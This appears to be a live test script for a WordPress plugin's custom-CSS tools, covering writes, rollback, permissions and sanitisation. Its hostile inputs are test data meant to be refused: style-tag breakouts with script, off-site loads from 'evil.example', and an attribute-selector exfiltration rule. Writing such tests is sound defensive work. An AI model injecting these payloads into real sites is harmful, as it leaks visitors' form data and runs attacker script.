"""Driven by custom-css-live.sh."""
import base64
import hashlib
import json
import os
import subprocess
import time
import urllib.error
import urllib.request

REPO = os.environ.get('WPENV_DIR') or os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..'))
SVC = os.environ.get('WPENV_SVC', 'cli')
BASE = os.environ.get('BASE', 'http://localhost:8888')
KEY = os.environ['KEY']
ADMIN_ID = int(os.environ['ADMIN_ID'])
PASSWORDS = {'admin': os.environ['PW_ADMIN'], 'editor': os.environ['PW_EDITOR'], 'author': os.environ['PW_AUTHOR'], 'contributor': os.environ['PW_CONTRIBUTOR']}
results = []
BS = chr(92)


def record(name, ok, detail=None):
    results.append((name, bool(ok)))
    print(f"  {'PASS' if ok else 'FAIL'}  {name}" + ('' if ok else f': {json.dumps(detail, default=str)[:500]}'))


def run(*args):
    out = subprocess.run(['npx', '@wordpress/env', 'run', SVC, *args], cwd=REPO, capture_output=True, text=True, stdin=subprocess.DEVNULL).stdout
    return [line.strip('\r') for line in out.splitlines() if line and not line.startswith(('ℹ', '✔'))]


def wp(*args):
    lines = run('wp', *args)
    return lines[-1] if lines else ''


def php(code):
    return wp('eval', code, '--user=admin')


def rpc(method, params, who='key'):
    if 'key' == who:
        auth = 'Bearer ' + KEY
    elif 'oauth' == who:
        auth = 'Bearer ' + os.environ['OAUTH_TOKEN']
    else:
        auth = 'Basic ' + base64.b64encode(f'{who}:{PASSWORDS[who]}'.encode()).decode()
    body = json.dumps({'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params}).encode()
    req = urllib.request.Request(BASE + '/wp-json/iato-mcp/v1/message', data=body, headers={'Content-Type': 'application/json', 'Authorization': auth})
    return json.loads(urllib.request.urlopen(req, timeout=180).read())['result']


def call(tool, args, who='key'):
    res = rpc('tools/call', {'name': tool, 'arguments': args}, who)
    text = res['content'][0]['text']
    try:
        data = json.loads(text)
    except ValueError:
        data = {'text': text}
    if not isinstance(data, dict):
        data = {'value': data}
    if res.get('isError'):
        data['isError'] = True
        data['_text'] = text
    return data


def refused(result, code):
    return bool(result.get('isError')) and result.get('error') == code


def forbidden(result, cap=''):
    return bool(result.get('isError')) and cap in result.get('_text', '') and ('capability' in result.get('_text', '') or 'not assigned' in result.get('_text', ''))


def home():
    with urllib.request.urlopen(f'{BASE}/?nocache={time.time()}', timeout=60) as response:
        return response.read().decode('utf-8', 'replace')


def sha(text):
    return hashlib.sha256(text.encode()).hexdigest()


def stored(stylesheet=None):
    sheet = f"'{stylesheet}'" if stylesheet else 'get_stylesheet()'
    encoded = php(f"$p=wp_get_custom_css_post({sheet});echo base64_encode($p?$p->post_content:'');")
    return base64.b64decode(encoded).decode()


def post_id(stylesheet=None):
    sheet = f"'{stylesheet}'" if stylesheet else 'get_stylesheet()'
    return int(php(f"$p=wp_get_custom_css_post({sheet});echo $p?$p->ID:0;") or 0)


def rollback(receipt, who='admin', **extra):
    return call('rollback', {'change_id': receipt['change_id'], **extra}, who)


def human_css(css):
    """What a person typed in the Customizer."""
    encoded = base64.b64encode(css.encode()).decode()
    php(f"kses_remove_filters();wp_update_custom_css_post(base64_decode('{encoded}'));echo 1;")


def remove_css_post():
    php("$p=wp_get_custom_css_post();if($p){wp_delete_post($p->ID,true);}echo 1;")


OWNER = wp('option', 'get', 'iato_mcp_key_owner')
wp('option', 'update', 'iato_mcp_key_owner', str(ADMIN_ID))
SHEET = wp('eval', 'echo get_stylesheet();')
remove_css_post()
print(f'# on {BASE}, theme {SHEET}, key owner was {OWNER}')

# ── Reading ─────────────────────────────────────────────────────────────────
print('# Reading')
r = call('get_custom_css', {})
record('no CSS yet: empty, with no post', r.get('css') == '' and r.get('post_id') is None and r.get('stylesheet') == SHEET and r.get('bytes') == 0, r)

# ── Writing ─────────────────────────────────────────────────────────────────
print('# Writing')
CSS = f'.iato-css-live > .x {{ color: rgb(1, 2, 3); }}\n.iato-css-live::after {{ content: "{BS}201C A & B"; }}\n@media (min-width: 600px) {{ .y {{ display: none; }} }}'
r = call('update_custom_css', {'css': CSS, 'dry_run': True})
record('a dry run says what would happen and writes nothing', r.get('dry_run') and r.get('action') == 'would_update' and r.get('bytes_after') == len(CSS) and 0 == post_id(), r)
FIRST = call('update_custom_css', {'css': CSS})
record('stored exactly as sent: a child combinator, a backslash, an ampersand', stored() == CSS, stored())
record('the response has sizes and hashes, not the CSS', FIRST.get('bytes_before') == 0 and FIRST.get('bytes_after') == len(CSS) and FIRST.get('sha256_after') == sha(CSS) and FIRST.get('post_id') == post_id() and CSS not in json.dumps(FIRST), FIRST)
receipt = FIRST.get('change_receipt', {})
record('a short receipt', receipt.get('change_id') and receipt.get('target_type') == 'custom_css' and 'before_value' not in receipt and receipt.get('actor', {}).get('user_id') == ADMIN_ID, receipt)
record('the whole site is purged', (FIRST.get('cache') or {}).get('scope') == 'all', FIRST.get('cache'))
page = home()
record('it is on the logged-out page, not escaped', '.iato-css-live > .x' in page and '&gt;' not in page[page.find('.iato-css-live'):page.find('.iato-css-live') + 40], page[page.find('.iato-css-live') - 60:page.find('.iato-css-live') + 80])
r = call('get_custom_css', {})
record('get_custom_css returns it, with its post', r.get('css') == CSS and r.get('post_id') == post_id() and r.get('bytes') == len(CSS), r)
r = call('update_custom_css', {'css': CSS})
record('the same CSS again: no receipt', 'change_receipt' not in r and 'isError' not in r, r)
r = call('update_custom_css', {'css': CSS, 'dry_run': True})
record('...and a dry run says no change', r.get('action') == 'no_change', r)

r = call('update_custom_css', {'append_css': '.z { margin: 0; }'})
record('append_css adds to the end, on a new line', stored() == CSS + '\n.z { margin: 0; }', stored())
second = r.get('change_receipt', {})
r2 = rollback(second)
record('rollback restores exactly what was there', stored() == CSS and r2.get('success'), (r2, stored()))
record('...purging the whole site', (r2.get('cache') or {}).get('scope') == 'all', r2.get('cache'))
r = call('update_custom_css', {'css': ''})
record('an empty css clears it', stored() == '' and post_id() > 0 and r.get('bytes_after') == 0, r)
record('...and it leaves the page', '.iato-css-live' not in home())
rollback(r['change_receipt'])
record('rollback of the clear brings it back', stored() == CSS)
r2 = rollback(FIRST['change_receipt'], force=True)
record('rollback of the first write removes the post it made, so there is no CSS at all', 0 == post_id() and r2.get('success') and call('get_custom_css', {}).get('post_id') is None, (r2, post_id()))
r = call('update_custom_css', {'append_css': '.first { top: 0; }'})
record('append_css with nothing there starts it', stored() == '.first { top: 0; }', stored())
remove_css_post()

print('# Bad input')
for label, args in (('neither', {}), ('both', {'css': 'a{}', 'append_css': 'b{}'}), ('a list', {'css': ['a{}']}), ('a number', {'css': 5})):
    r = call('update_custom_css', args)
    record(f'{label}: invalid_css_input', refused(r, 'invalid_css_input') and r.get('message'), r)
big = 'a{}' + ' ' * 204800
r = call('update_custom_css', {'css': big})
record('over 200 KB: css_too_large, with the numbers', refused(r, 'css_too_large') and r.get('max_bytes') == 204800 and r.get('bytes') == len(big), {k: r.get(k) for k in ('error', 'bytes', 'max_bytes')})
fits = '.big { color: red; }\n' * 9000
start = time.time()
r = call('update_custom_css', {'css': fits})
record('just under: stored', stored() == fits and 'isError' not in r, {k: r.get(k) for k in ('error', 'message', 'bytes_after')})
print(f'  note: {len(fits)} bytes took {time.time() - start:.1f}s')
r = call('update_custom_css', {'append_css': ' ' * 30000 + 'a{}'})
record('appending past 200 KB: refused, counted after appending', refused(r, 'css_too_large') and stored() == fits, {k: r.get(k) for k in ('error', 'bytes')})
remove_css_post()

print('# What closes the style element')
for label, sent, kept in (
    ('the plain tag', 'a{color:red}</style>', 'a{color:red}'),
    ('upper case', 'a{color:red}</STYLE>', 'a{color:red}'),
    ('a space', 'a{color:red}</style >', 'a{color:red}'),
    ('at the very end', 'a{color:red}</style', 'a{color:red}'),
    ('one hidden in another', 'a{color:red}</st</style>yle>', 'a{color:red}'),
):
    r = call('update_custom_css', {'css': sent})
    report = (r.get('sanitized_report') or {})
    record(f'{label}: taken out, and reported', stored() == kept and report and 'style' in json.dumps(report), (r, stored()))
    record(f'{label}: nothing like it on the page', '</style' not in stored().lower(), stored())
r = call('update_custom_css', {'css': 'a{}</style><script>alert(1)</script>'})
record('a breakout attempt: refused whole', refused(r, 'css_not_allowed') and 'alert' not in stored(), r)
r = call('update_custom_css', {'css': 'a{color:blue}</style>', 'dry_run': True})
record('a dry run reports the same', r.get('sanitized_report') and stored() == 'a{color:red}', r)
remove_css_post()

print('# Loading from another site')
EVIL = 'https://evil.example'
for label, sent in (
    ('@import of a URL', f'@import url({EVIL}/x.css);'),
    ('@import of a string', f'@import "{EVIL}/x.css";'),
    ('a background image', f'.x {{ background: url({EVIL}/x.png); }}'),
    ('no scheme', '.x { background: url(//evil.example/x.png); }'),
    ('an escaped slash', f'.x {{ background: url(/{BS}/evil.example/x.png); }}'),
    ('an escaped url(', f'.x {{ background: {BS}75 rl({EVIL}/x.png); }}'),
    ('an escaped @import', f'@{BS}69mport "{EVIL}/x.css";'),
    ('image-set', f'.x {{ background: image-set("{EVIL}/x.png" 1x); }}'),
    ('a font', f'@font-face {{ font-family: x; src: url({EVIL}/x.woff2); }}'),
    ('a data-stealing selector', f'input[value^="a"] {{ background: url({EVIL}/?a); }}'),
    ('a javascript URL', '.x { background: url(javascript:alert(1)); }'),
):
    r = call('update_custom_css', {'css': sent})
    record(f'{label}: refused, saying what, and nothing stored', refused(r, 'css_not_allowed') and r.get('found') and '' == stored(), r)
    r = call('update_custom_css', {'append_css': sent})
    record(f'{label}: refused through append_css too', refused(r, 'css_not_allowed') and '' == stored(), r)
for label, sent in (
    ('a local image', '.x { background: url(/wp-content/uploads/a.png); }'),
    ('a data image', '.x { background: url(data:image/png;base64,iVBORw0KGgo=); }'),
    (f'this site by name', f'.x {{ background: url({BASE}/a.png); }}'),
):
    r = call('update_custom_css', {'css': sent})
    record(f'{label}: stored', stored() == sent, r)
human_css(f'@import "{EVIL}/from-a-person.css";\n.h {{ top: 0; }}')
r = call('update_custom_css', {'append_css': '.added { left: 0; }'})
record('what a person put in the Customizer stays when something is appended', stored() == f'@import "{EVIL}/from-a-person.css";\n.h {{ top: 0; }}\n.added {{ left: 0; }}', (r, stored()))
r2 = rollback(r['change_receipt'])
record('rollback restores a person\'s CSS as it was, off-site load included', stored() == f'@import "{EVIL}/from-a-person.css";\n.h {{ top: 0; }}', (r2, stored()))
r = call('update_custom_css', {'css': stored()})
record('sending it all back through this tool is judged as new, though it has not changed', refused(r, 'css_not_allowed'), r)
remove_css_post()

print('# Conflicts')
r = call('update_custom_css', {'css': '.a { top: 0; }'})
r1 = call('update_custom_css', {'css': '.b { top: 0; }'})
human_css('.c { top: 0; }')
r2 = rollback(r1['change_receipt'])
record('a newer change is a conflict', refused(r2, 'rollback_conflict') and stored() == '.c { top: 0; }', r2)
r2 = rollback(r1['change_receipt'], dry_run=True)
record('...a dry run says so', r2.get('conflict_check', {}).get('status') == 'conflict' or refused(r2, 'rollback_conflict'), r2)
r2 = rollback(r1['change_receipt'], force=True)
record('force restores it', stored() == '.a { top: 0; }', r2)
r2 = rollback(r1['change_receipt'], force=True)
record('it cannot be rolled back twice', refused(r2, 'already_rolled_back') or r2.get('isError'), r2)
remove_css_post()

print('# A theme switch')
OTHER = 'twentytwentyone' if SHEET != 'twentytwentyone' else 'twentytwentyfour'
r = call('update_custom_css', {'css': '.one { top: 0; }'})
r1 = call('update_custom_css', {'css': '.two { top: 0; }'})
wp('theme', 'activate', OTHER)
r = call('get_custom_css', {})
record('the other theme has its own, empty', r.get('stylesheet') == OTHER and r.get('css') == '', r)
r3 = call('update_custom_css', {'css': '.other { top: 0; }'})
record('a write goes to the active theme', stored(OTHER) == '.other { top: 0; }' and stored(SHEET) == '.two { top: 0; }', r3)
r2 = rollback(r1['change_receipt'])
record('rollback restores the theme it was written for, not the active one', stored(SHEET) == '.one { top: 0; }' and stored(OTHER) == '.other { top: 0; }', (r2, stored(SHEET)))
rollback(r3['change_receipt'])
record('...and the other rolls back to no post', 0 == post_id(OTHER))
wp('theme', 'activate', SHEET)
remove_css_post()

print('# Who may do what')
human_css('.base { top: 0; }')
for who, label in (('contributor', 'a Contributor'), ('author', 'an Author'), ('editor', 'an Editor')):
    r = call('update_custom_css', {'css': 'a{}'}, who)
    record(f'{label} cannot write it', forbidden(r, 'manage_options') and stored() == '.base { top: 0; }', r)
    r = call('get_custom_css', {}, who)
    record(f'{label} cannot read it here', forbidden(r, 'edit_theme_options'), r)
wp('option', 'update', 'iato_mcp_key_owner', '0')
r = call('get_custom_css', {})
record('an unbound key can read it', r.get('css') == '.base { top: 0; }', r)
r = call('update_custom_css', {'css': 'a{}'})
record('an unbound key cannot write it: no user holds the capability', refused(r, 'iato_mcp_token_unbound') or forbidden(r), r)
record('...nothing was written', stored() == '.base { top: 0; }')
wp('option', 'update', 'iato_mcp_key_owner', str(ADMIN_ID))
written = call('update_custom_css', {'css': '.bound { top: 0; }'})
wp('option', 'update', 'iato_mcp_key_owner', '0')
r = rollback(written['change_receipt'], 'key')
record('an unbound key cannot roll it back either', r.get('isError') and stored() == '.bound { top: 0; }', r)
wp('option', 'update', 'iato_mcp_key_owner', str(ADMIN_ID))
r = rollback(written['change_receipt'], 'editor')
record('nor can an Editor', r.get('isError') and stored() == '.bound { top: 0; }', r)
for label, who in (('administrator password', 'admin'), ('OAuth', 'oauth'), ('bound site key', 'key')):
    r = call('update_custom_css', {'css': f'.{who} {{ top: 0; }}'}, who)
    record(f'{label}: writes', stored() == f'.{who} {{ top: 0; }}' and r.get('change_receipt'), r)
    r2 = rollback(r['change_receipt'], who)
    record(f'{label}: rolls back', stored() != f'.{who} {{ top: 0; }}' and r2.get('success'), r2)

MU = "WP_CONTENT_DIR.'/mu-plugins/iato-custom-css-test.php'"
php(f"@mkdir(dirname({MU}));file_put_contents({MU},'<?php add_filter(\"map_meta_cap\",function($c,$cap){{return in_array($cap,[\"unfiltered_html\",\"edit_css\"],true)?[\"do_not_allow\"]:$c;}},99,2);');echo 1;")
r = call('update_custom_css', {'css': 'a{}'}, 'admin')
record('a site with unfiltered HTML turned off: an administrator cannot write it', forbidden(r, 'edit_css') and stored() != 'a{}', r)
php(f"unlink({MU});echo 1;")

print('# Older receipts')
r = call('update_custom_css', {'css': '.kept { top: 0; }'})
change_id = r['change_receipt']['change_id']
table = "{$wpdb->prefix}iato_change_receipts"
php(f"global $wpdb;$wpdb->query($wpdb->prepare(\"UPDATE {table} SET before_value=NULL,pruned_at=%s WHERE change_id=%s\",gmdate('Y-m-d H:i:s'),'{change_id}'));echo 1;")
r2 = call('rollback', {'change_id': change_id, 'force': True})
record('after the retention job: rollback_unavailable, pointing at revisions', refused(r2, 'rollback_unavailable') and 'revisions' in r2.get('message', '') and stored() == '.kept { top: 0; }', r2)

wp('option', 'update', 'iato_mcp_key_owner', OWNER)

failed = [name for name, ok in results if not ok]
print(f'# {len(results) - len(failed)} passed, {len(failed)} failed')
if failed:
    print('failed:', '; '.join(failed)[:800])
    raise SystemExit(1)
